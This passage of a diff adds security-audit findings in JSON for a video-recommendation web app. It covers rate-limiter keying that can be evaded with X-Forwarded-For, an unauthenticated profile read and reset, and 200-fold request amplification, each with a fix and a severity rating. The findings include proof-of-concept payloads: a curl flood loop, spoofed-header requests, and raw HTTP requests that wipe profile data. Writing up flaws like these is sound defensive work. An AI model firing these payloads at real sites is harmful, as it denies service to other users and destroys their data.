+        "line": 123,
+        "scope": "allow",
+        "description": "A single deque per \"{ip}:{path}\" key rejects every request once 90 entries fall within the 60-second window, so all users sharing the proxy address are refused together."
+      }
+    ],
+    "conditions": [
+      {
+        "kind": "network_routing",
+        "description": "The Client backend must sit behind a reverse proxy or load balancer, which the X-Forwarded-For/X-Forwarded-Proto handling and the loopback default bind both imply. On a direct-exposure deployment the keying is correct and only the Engine half of the defect applies."
+      },
+      {
+        "kind": "authentication_level",
+        "description": "None."
+      }
+    ],
+    "execution": {
+      "attacker_perspective": "Any anonymous client that can reach the site, aiming to deny the feed to all other visitors.",
+      "payloads": [
+        "for i in $(seq 1 90); do curl -s -o /dev/null -X POST https://<site>/recommendations -H 'content-type: application/json' -d '{}'; done",
+        "curl -s https://<engine>/api/channels -H \"X-Forwarded-For: 1.2.3.$RANDOM\""
+      ],
+      "instructions": [
+        "Send 90 POST requests to /recommendations within one minute from any single client.",
+        "From a different network, request the same route as an ordinary visitor.",
+        "Observe HTTP 429 with {\"error\":\"Rate limit exceeded\"} despite never having made a request.",
+        "Against a directly reachable Engine, repeat any /api/ request with a randomised X-Forwarded-For header and observe that the limiter never triggers."
+      ],
+      "expected_result": "Unrelated visitors receive HTTP 429 from the Client backend for the remainder of the 60-second window, while an attacker spoofing X-Forwarded-For at the Engine is never limited."
+    },
+    "remediation": {
+      "strategy": "Resolve the client address once, from a helper that trusts X-Forwarded-For only when the TCP peer is a configured trusted proxy, and use that helper for rate limiting in both services.",
+      "code_changes": [
+        {
+          "file_name": "client/backend/server.py",
+          "fixed_code": "TRUSTED_PROXIES = frozenset(os.environ.get(\"CLIENT_TRUSTED_PROXIES\", \"127.0.0.1\").split(\",\"))\n\ndef _rate_limit_key_ip(self) -> str:\n    peer = self.client_address[0] if self.client_address else \"unknown\"\n    if peer not in TRUSTED_PROXIES:\n        return peer\n    forwarded = self.headers.get(\"X-Forwarded-For\", \"\").split(\",\")[0].strip()\n    return forwarded or peer\n\ndef _rate_limit_check(self, path: str) -> bool:\n    return self.server.rate_limiter.allow(f\"{self._rate_limit_key_ip()}:{path}\")"
+        }
+      ]
+    },
+    "severity": {
+      "likelihood": {
+        "score": "high",
+        "reason": "Ninety ordinary requests from one client, no tooling and no preconditions beyond the standard proxied deployment."
+      },
+      "impact": {
+        "score": "medium",
+        "reason": "Denial of service against the feed for all users of the deployment for the duration of each window, and removal of the only abuse control in front of the event-ingest and profile endpoints."
+      },
+      "overall_severity": "medium"
+    },
+    "confidence": {
+      "score": "medium",
+      "reason": "The keying defect is plain in source and the limiter semantics were read in full. The impact depends on the deployment sitting behind a proxy, which is strongly implied by the forwarded-header handling and the loopback bind but is not pinned down by a checked-in proxy configuration (dev/nginx is gitignored)."
+    }
+  },
+  {
+    "verdict": "confirmed",
+    "title": "Server-side profile has no identity: any visitor can read or wipe the shared like history",
+    "description": "resolve_user_id returns whatever string the caller supplies and falls back to the constant \"local-user\". The frontend never sends a user_id, so every visitor's likes recorded through /api/user-action are written to that one row. GET /api/user-profile returns the row's likes and POST /api/user-profile/reset deletes them, both unauthenticated, and supplying an arbitrary user_id reads or wipes any other profile that happens to exist. The practical impact is bounded: the stored data is video ids and instance hostnames for the deployment as a whole, and the frontend's personalisation actually runs off localStorage, so the server-side profile is largely vestigial. It remains cross-visitor data that any visitor can read and destroy.",
+    "root_cause": "resolve_user_id in client/backend/lib/http_utils.py does not tie the profile identifier to any authenticated session or signed token, allowing any caller to name an arbitrary profile and read or delete it through the unauthenticated /api/user-profile routes.",
+    "intended_behavior": "Each visitor should have their own like history, used to personalise recommendations. The user_id parameter is the seam where a real identity was meant to be supplied; today it is an unauthenticated free-text field and the whole deployment collapses onto a single default profile.",
+    "trace": [
+      {
+        "kind": "entrypoint",
+        "file": "client/backend/server.py",
+        "line": 233,
+        "scope": "do_POST",
+        "description": "POST /api/user-profile/reset is routed with only a rate-limit check; there is no authentication in this service."
+      },
+      {
+        "kind": "propagation",
+        "file": "client/backend/lib/http_utils.py",
+        "line": 33,
+        "scope": "resolve_user_id",
+        "description": "Returns the caller-supplied string unchanged, or the constant \"local-user\" when it is absent - the value every browser request ends up using."
+      },
+      {
+        "kind": "propagation",
+        "file": "client/backend/server.py",
+        "line": 608,
+        "scope": "_handle_user_profile_reset",
+        "description": "Resolves the caller-supplied user_id from the request body and passes it to the store without any ownership check."
+      },
+      {
+        "kind": "sink",
+        "file": "client/backend/lib/users_store.py",
+        "line": 114,
+        "scope": "clear_likes",
+        "description": "DELETE FROM likes WHERE user_id = ? removes every like row for the named profile."
+      }
+    ],
+    "conditions": [
+      {
+        "kind": "authentication_level",
+        "description": "None. No sessions, cookies or tokens exist anywhere in the application."
+      },
+      {
+        "kind": "data_state",
+        "description": "Reading another profile requires knowing its identifier; in practice every deployment has exactly one, the default \"local-user\"."
+      }
+    ],
+    "execution": {
+      "attacker_perspective": "Any anonymous visitor of the deployment.",
+      "payloads": [
+        "GET /api/user-profile HTTP/1.1",
+        "POST /api/user-profile/reset HTTP/1.1\\r\\nContent-Type: application/json\\r\\n\\r\\n{\"user_id\":\"local-user\"}"
+      ],
+      "instructions": [
+        "Request GET /api/user-profile against the Client backend and read the returned likes array.",
+        "POST the reset payload above to /api/user-profile/reset.",
+        "Request the profile again and observe that the like history is gone."
+      ],
+      "expected_result": "The first request discloses the deployment-wide like history (video ids, uuids and instance domains); after the reset the same request returns an empty likes array."
+    },
+    "remediation": {
+      "strategy": "Either bind the profile to a signed httpOnly cookie issued by the Client backend and ignore any caller-supplied user_id, or remove the server-side profile endpoints and users DB altogether, since the frontend already personalises from localStorage.",
+      "code_changes": [
+        {
+          "file_name": "client/backend/lib/http_utils.py",
+          "fixed_code": "def resolve_user_id(handler: BaseHTTPRequestHandler) -> str:\n    \"\"\"Return the profile id from the signed session cookie, minting one if absent.\"\"\"\n    cookie = SimpleCookie(handler.headers.get(\"Cookie\", \"\"))\n    raw = cookie[\"ptb_sid\"].value if \"ptb_sid\" in cookie else \"\"\n    verified = verify_signed_session(raw)  # HMAC over the id with a server-side key\n    return verified or issue_session(handler)"
+        }
+      ]
+    },
+    "severity": {
+      "likelihood": {
+        "score": "high",
+        "reason": "Two unauthenticated requests with no preconditions."
+      },
+      "impact": {
+        "score": "low",
+        "reason": "The exposed data is video identifiers and instance hostnames aggregated for the whole deployment, not personal or secret material, and the destroyed state does not affect the frontend's own personalisation, which reads from localStorage."
+      },
+      "overall_severity": "low"
+    },
+    "confidence": {
+      "score": "high",
+      "reason": "Read in full: the resolver, both route handlers, and the store functions. The observation that the frontend never sends user_id was confirmed across all three data modules."
+    }
+  },
+  {
+    "verdict": "confirmed",
+    "title": "Request amplification: one profile-likes request triggers up to 200 sequential Engine round-trips",
+    "description": "POST /api/user-profile/likes accepts up to MAX_CLIENT_LIKES (200) uuid/host entries and passes them to resolve_videos_by_uuid_host, which loops over the entries and issues one separate HTTP POST to the Engine's /internal/videos/resolve per entry, each with a six-second timeout and each taking the Engine's db_lock. One inbound request therefore costs up to 200 sequential upstream round-trips on a thread of the Client backend's ThreadingHTTPServer. The Engine already exposes a batch metadata endpoint, so the per-entry loop is avoidable. The rate limiter nominally caps this at 90 requests per minute, but that budget is shared across all users behind a proxy rather than per-user (see the rate-limiter finding), so the cap does not isolate the abuse.",
+    "root_cause": "resolve_videos_by_uuid_host in client/backend/lib/engine_api_client.py does not batch its lookups, issuing one blocking Engine request per submitted like entry and allowing a single client request to multiply into hundreds of upstream requests.",
+    "intended_behavior": "The endpoint should turn a visitor's locally stored likes into display metadata using as few Engine calls as possible - the companion function fetch_metadata_for_entries already does exactly that in one batched call.",
+    "trace": [
+      {
+        "kind": "entrypoint",
+        "file": "client/backend/server.py",
+        "line": 239,
+        "scope": "do_POST",
+        "description": "POST /api/user-profile/likes is routed after a rate-limit check, unauthenticated."
+      },
+      {
+        "kind": "propagation",
+        "file": "client/backend/server.py",
+        "line": 640,
+        "scope": "_handle_user_profile_likes_from_client",
+        "description": "Parses up to MAX_CLIENT_LIKES (200) uuid/host entries from the request body."
+      },
+      {
+        "kind": "propagation",
+        "file": "client/backend/server.py",
+        "line": 645,
+        "scope": "_handle_user_profile_likes_from_client",
+        "description": "Calls resolve_videos_by_uuid_host with the full list."
+      },
+      {
+        "kind": "sink",
+        "file": "client/backend/lib/engine_api_client.py",
+        "line": 111,
+        "scope": "resolve_videos_by_uuid_host",
+        "description": "Inside the per-entry loop, calls resolve_video_seed - one blocking HTTP POST to the Engine per entry, each acquiring the Engine's db_lock."
+      }
+    ],
+    "conditions": [
+      {
+        "kind": "authentication_level",
+        "description": "None."
+      },
+      {
+        "kind": "network_routing",
+        "description": "Amplification is most effective when the rate-limit bucket is shared or bypassable; see the rate-limiter finding."
+      }
+    ],
+    "execution": {
+      "attacker_perspective": "Any anonymous client aiming to exhaust the Engine's request and lock capacity cheaply.",
+      "payloads": [
+        "POST /api/user-profile/likes HTTP/1.1\\r\\nContent-Type: application/json\\r\\n\\r\\n{\"likes\":[{\"uuid\":\"00000000-0000-4000-8000-000000000001\",\"host\":\"a.example\"}, ... 200 distinct entries ...]}"
+      ],
+      "instructions": [
+        "Build a body containing 200 distinct uuid/host pairs so that the deduplication set in resolve_videos_by_uuid_host does not collapse them.",
+        "POST it to /api/user-profile/likes repeatedly and concurrently.",
+        "Observe the Engine handling 200 sequential /internal/videos/resolve requests per inbound request, each serialised on db_lock."
+      ],
+      "expected_result": "Sustained requests saturate the Client backend's worker threads and serialise on the Engine's database lock, degrading feed latency for other users."
+    },
+    "remediation": {
+      "strategy": "Batch the resolve into a single Engine call and lower the per-request entry cap to the number the profile view actually displays.",
+      "code_changes": [
+        {
+          "file_name": "client/backend/lib/engine_api_client.py",
+          "fixed_code": "def resolve_videos_by_uuid_host(engine_base_url: str, likes: list[dict[str, str]]) -> list[dict[str, Any]]:\n    \"\"\"Resolve uuid/host likes to canonical Engine identity entries in one batched call.\"\"\"\n    unique = _dedupe(likes)\n    if not unique:\n        return []\n    status, body = _post_json(\n        f\"{engine_base_url.rstrip('/')}/internal/videos/resolve-batch\",\n        {\"entries\": unique},\n    )\n    ..."
+        }
+      ]
+    },
+    "severity": {
+      "likelihood": {
+        "score": "medium",
+        "reason": "Trivial to send, but sustaining the load requires continuous effort and the effect is degradation rather than a hard outage."
+      },
+      "impact": {
+        "score": "low",
+        "reason": "Availability degradation only; no data is disclosed or altered."
+      },
+      "overall_severity": "low"
+    },
+    "confidence": {
+      "score": "high",
+      "reason": "The per-entry loop, the 200-entry cap and the Engine-side lock acquisition were all read in source. The severity of the degradation under real load was not measured."
+    }
+  }
+]
